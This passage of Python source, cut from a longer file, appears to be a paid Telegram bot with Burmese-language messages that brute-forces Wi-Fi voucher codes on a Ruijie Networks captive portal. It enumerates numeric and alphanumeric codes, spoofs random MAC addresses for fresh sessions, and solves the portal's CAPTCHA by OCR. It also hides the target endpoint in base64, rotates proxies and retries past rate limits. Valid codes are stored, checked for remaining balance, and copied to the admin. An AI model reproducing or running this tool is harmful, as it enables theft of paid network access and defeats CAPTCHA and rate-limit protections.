        print(f"users_list error: {e}")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    try:
        user_id = str(message.chat.id)
        if not auth_system.is_authenticated(user_id):
            await bot.reply_to(message, "🔐 Authentication ပြုလုပ်ပါ။")
            return

        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /key [your_key]")
            return

        key = args[1].strip()
        key_info = db_get_key(key)
        if not key_info or not check_key_expiration(key_info["expires_at"]):
            await bot.reply_to(message, "❌ KEY မမှန်ပါ။")
            return

        db_add_user(user_id, key)
        approve[message.chat.id] = True
        paid_users[user_id] = True

        await bot.reply_to(message, f"✅ PAID USER ဖြစ်ပါပြီ။\n\nKEY: {key}")
    except Exception as e:
        print(f"handle_key error: {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    try:
        if not is_admin(str(message.chat.id)):
            return
        if not auth_system.is_authenticated(str(message.chat.id)):
            await bot.reply_to(message, "🔐 Auth လုပ်ပါ။")
            return

        args = message.text.split()
        if len(args) < 4:
            await bot.reply_to(message, "Usage: /genkey [plan] [limit] [user_id]")
            return

        plan = args[1]
        code_limit = int(args[2])
        user_id = args[3]

        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "❌ Plan မမှန်ပါ။")
            return

        new_key = generate_random_key(12)
        db_add_key(new_key, user_id, plan, expiry, code_limit)

        await bot.reply_to(
            message,
            f"✅ Key Generated!\n\n🔑 `{new_key}`\n👤 `{user_id}`\n📋 {plan}\n🔢 {code_limit}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"genkey error: {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    try:
        if not is_admin(str(message.chat.id)):
            return
        args = message.text.split()
        if len(args) < 2:
            return
        key = args[1]
        db_delete_key(key)
        await bot.reply_to(message, f"✅ Deleted: {key}")
    except Exception as e:
        print(f"delkey error: {e}")

@bot.message_handler(commands=['sendall'])
async def send_all_broadcast(message):
    try:
        if not is_admin(str(message.chat.id)):
            return
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return
        broadcast_text = f"📢 ADMIN\n\n{args[1]}"
        users = db_get_all_users()
        count = 0
        for uid in users:
            try:
                await bot.send_message(int(uid), broadcast_text)
                count += 1
                await asyncio.sleep(0.1)
            except:
                continue
        await bot.reply_to(message, f"✅ Sent to {count} users")
    except Exception as e:
        print(f"broadcast error: {e}")

@bot.message_handler(commands=['portal'])
async def handle_portal(message):
    try:
        user_id = str(message.chat.id)
        if user_id not in paid_users and user_id not in approve:
            await bot.reply_to(message, "❌ PAID USER မဟုတ်ပါ။")
            return

        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await bot.reply_to(message, "Usage: /portal [url]")
            return

        url = args[1]
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}

        use_proxy = db_get_proxy_setting(user_id)

        if await check_session_url(session_url=url, use_proxy=use_proxy):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "✅ URL Saved!", reply_markup=get_voucher_keyboard())
        else:
            await bot.reply_to(message, "❌ URL မှားနေပါသည်။")
    except Exception as e:
        print(f"portal error: {e}")

@bot.message_handler(commands=['scan'])
async def handle_key_scan(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return
        mode = args[1]
        chat_id = message.chat.id
        user_id = str(chat_id)

        if user_id not in paid_users and user_id not in approve:
            return

        if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
            await bot.reply_to(message, "Portal URL အရင်ထည့်ပါ။")
            return

        progress_msg = await bot.send_message(chat_id, "🔍 Scanning...\n\n")
        scan_id = str(uuid.uuid4())

        task = asyncio.create_task(
            run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'], scan_id,
                          message=message, progress_msg=progress_msg)
        )
        scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    except Exception as e:
        print(f"scan error: {e}")

@bot.message_handler(commands=['stop'])
async def stop_scan_command(message):
    try:
        chat_id = message.chat.id
        data = scan_tasks.get(chat_id)
        if data and not data["task"].done():
            data["stop"] = True
            data["scan_id"] = None
            await send_success_file(chat_id)
            data["task"].cancel()
            await bot.reply_to(message, "🛑 Stopped.")
        else:
            await bot.reply_to(message, "Scan မရှိပါ။")
    except Exception as e:
        print(f"stop error: {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    try:
        user_id = str(message.chat.id)
        results = db_get_results(user_id)
        if results:
            await bot.reply_to(message, "✅ Codes:\n" + "\n".join(results))
        else:
            await bot.reply_to(message, "Code မရှိသေးပါ။")
    except Exception as e:
        print(f"result error: {e}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    await recheck_command(message)

async def recheck_command(message):
    """✅ FIXED: recheck_command function"""
    try:
        chat_id = message.chat.id
        user_id = str(chat_id)

        results = db_get_results(user_id)
        if not results:
            await bot.reply_to(message, "Code မရှိပါ။")
            return

        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.reply_to(message, "Portal URL အရင်ထည့်ပါ။")
            return

        await bot.reply_to(message, "🔄 Rechecking...")
        recheck_list = []
        for code in results:
            recode = await perform_check(
                user_data[chat_id]["session_url"], code, chat_id,
                scan_id=None, recheck=True, message=message
            )
            if recode:
                recheck_list.append(recode)

        to_show = "\n".join(recheck_list) if recheck_list else "မတွေ့ပါ။"
        await bot.reply_to(message, f"✅ Rechecked:\n{to_show}")
        if recheck_list:
            db_save_results(user_id, recheck_list)
    except Exception as e:
        print(f"recheck error: {e}")

@bot.message_handler(commands=['status'])
async def status_command(message):
    if not is_admin(str(message.chat.id)):
        return
    await stats_command(message)

@bot.message_handler(commands=['proxy'])
async def proxy_command(message):
    try:
        user_id = str(message.chat.id)
        if user_id not in paid_users and user_id not in approve:
            return
        current = db_get_proxy_setting(user_id)
        new_status = not current
        db_set_proxy_setting(user_id, new_status)
        status_text = "ON" if new_status else "OFF"
        await bot.reply_to(message, f"🔄 Proxy {status_text}")
    except Exception as e:
        print(f"proxy error: {e}")

@bot.message_handler(commands=['auth_status'])
async def auth_status_command(message):
    try:
        user_id = str(message.chat.id)
        status_text = f"""🔐 **Auth Status**

Layer 1: {'✅' if auth_system.layer1_verified.get(user_id, False) else '❌'}
Layer 2: {'✅' if auth_system.is_authenticated(user_id) else '❌'}"""
        await bot.reply_to(message, status_text, parse_mode="Markdown")
    except Exception as e:
        print(f"auth_status error: {e}")

# ==================== FILE EXPORT ====================

async def send_success_file(chat_id):
    if chat_id in success_texts and success_texts[chat_id]:
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"success_codes_{chat_id}_{timestamp}.txt"
            content = "\n\n".join(success_texts[chat_id])

            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"Success Codes\n")
                f.write(f"User: {chat_id}\n")
                f.write(f"Total: {len(success_texts[chat_id])}\n\n")
                f.write(content)

            with open(filename, "rb") as f:
                await bot.send_document(chat_id, f, caption=f"✅ Found {len(success_texts[chat_id])} codes")

            try:
                with open(filename, "rb") as f:
                    await bot.send_document(ADMIN_IDS[0], f, caption=f"📁 From User {chat_id}")
            except:
                pass

            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            print(f"send_file error: {e}")

# ==================== CORE SCANNING ====================

def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

strings_mixed = string.ascii_lowercase + string.digits
def mixed_generator(length=6):
    return "".join(random.choice(strings_mixed) for _ in range(length))

def iter_codes(mode, start_digit=None):
    if mode in ["6", "7", "8"]:
        length = int(mode)
        if start_digit is not None:
            start = int(start_digit) * (10 ** (length - 1))
            end = (int(start_digit) + 1) * (10 ** (length - 1))
            for i in range(start, end):
                yield str(i).zfill(length)
            return
        if mode in ["6", "7"]:
            codes = [str(i).zfill(length) for i in range(10 ** length)]
            random.shuffle(codes)
            yield from codes
            return
        if mode == "8":
            while True:
                yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    if mode == "mixed":
        while True:
            yield mixed_generator(6)
    if mode == "mixed8":
        while True:
            yield mixed_generator(8)
    raise ValueError(f"Unsupported: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        percent = (checked / total) * 100 if total > 0 else 0
        return (
            f"🔍Scanning...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Hits : {found}"
        )
    return (
        f"🔍Scanning...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Hits : {found}"
    )

async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None, start_digit=None):
    global _voucher_sem
    current_speed = MAX_CONCURRENT
    current_batch_size = BATCH_SIZE

    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    if mode in ["6", "7"]:
        total = 10 ** int(mode)
    elif mode == "8":
        total = 10 ** 8
    else:
        total = None

    checked = 0
    retries = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    local_sem = asyncio.Semaphore(current_speed)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                return

            batch = []
            for _ in range(current_batch_size):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                user_info = db_get_user(str(chat_id))
                if user_info:
                    key_info = db_get_key(user_info["key"])
                    if not key_info or not check_key_expiration(key_info["expires_at"]):
                        approve[chat_id] = False
                        paid_users.pop(str(chat_id), None)
                        await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                        scan_tasks.pop(chat_id, None)
                        success_messages.pop(chat_id, None)
                        success_texts.pop(chat_id, None)
                        return
                last_key_check = time.monotonic()

            async def _check(code):
                async with local_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
            checked += len(batch)

            found = len(success_texts.get(chat_id, []))
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            text = format_progress(checked, total, speed, found, retries) if total else format_progress(checked, None, speed, found, retries)

            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                try:
                    new_msg = await bot.send_message(chat_id, text)
                    progress_msg.message_id = new_msg.message_id
                except:
                    pass

        if progress_msg:
            found = len(success_texts.get(chat_id, []))
            finish_text = f"🔍Completed\n\n📦Checked: {checked:,}\n✅Hits: {found}"
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=finish_text)
            except:
                pass

        await send_success_file(chat_id)
    finally:
        await send_success_file(chat_id)
        scan_tasks.pop(chat_id, None)

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

# ==================== NETWORK FUNCTIONS ====================

async def check_session_url(session_url, use_proxy=True):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }
    proxy = get_next_proxy() if use_proxy else None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(session_url, allow_redirects=True, headers=headers, proxy=proxy) as response:
                return "sessionId" in str(response.url)
    except Exception as e:
        print(f"URL Check Error: {e}")
        return False

async def get_session_id(session, session_url, previous_session_id=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        return previous_session_id

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None

    for _attempt in range(2):
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(), timeout=timeout
        ) as task_session:
            session_id = await get_session_id(task_session, session_url, None)
            if not session_id:
                return
            auth_code = None
            for _ in range(5):
                try:
                    image = await Captcha_Image(task_session, session_id)
                    text = await Captcha_Text(image)
                    if not text:
                        continue
                    verified = await Varify_Captcha(task_session, session_id, text)
                    if verified:
                        auth_code = text
                        break
                except:
                    pass
            if not auth_code:
                return

            data = {
                "accessCode": code,
                "sessionId": session_id,
                "apiVersion": 1,
                "authCode": auth_code,
            }
            headers = {
                "authority": "portal-as.ruijienetworks.com",
                "accept": "*/*",
                "content-type": "application/json",
                "origin": "https://portal-as.ruijienetworks.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
            }

            try:
                async with task_session.post(post_url, json=data, headers=headers) as req:
                    response = await req.text()
            except Exception as e:
                print(f"[perform_check] error: {e}")
                return
        if response and 'request limited' in response:
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code
        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date, _ = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        results = db_get_results(str(chat_id))
        if code not in results:
            results.append(code)
            db_save_results(str(chat_id), results)

        if message:
            try:
                sent = await bot.send_message(chat_id=message.chat.id, text=f"Success:\n\n🎫 {code}\n   {expire_date}")
            except:
                pass

def Minute_to_Hour(total_minutes):
    if total_minutes == 'Unknown':
        return 'Unknown'
    try:
        mins = int(total_minutes)
        h = mins // 60
        m = mins % 60
        if h > 0 and m > 0:
            return f"{h}h {m}m"
        elif h > 0:
            return f"{h}h"
        return f"{m}m"
    except:
        return 'Unknown'

async def Code_Expires_Date(active_id):
    paths = [
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}'
    ]
    headers = {'authority': 'portal-as.ruijienetworks.com', 'accept': 'application/json'}
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as session:
        for url in paths:
            try:
                async with session.get(url, headers=headers) as req:
                    if req.status == 200:
                        respond = await req.json()
                        if respond.get('success'):
                            result = respond.get('result', {})
                            raw_minutes = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
                            profile = result.get('profileName', 'Unknown')
                            return f"📋 {profile} | ⏳ {Minute_to_Hour(raw_minutes)}", raw_minutes
            except:
                continue
    return "📋 Unknown", 'Unknown'

_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {'accept': 'image/*,*/*;q=0.8'}
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {'content-type': 'application/json'}
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

# ==================== WEB SERVER ====================

async def handle(request):
    return web.Response(text="Bot running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==================== MAIN ====================

async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Retry in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected: {e}. Retry in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        limit_per_host=CONNECTION_PER_HOST,
        ttl_dns_cache=300,
        ssl=False
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False
    )
    try:
        asyncio.create_task(web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
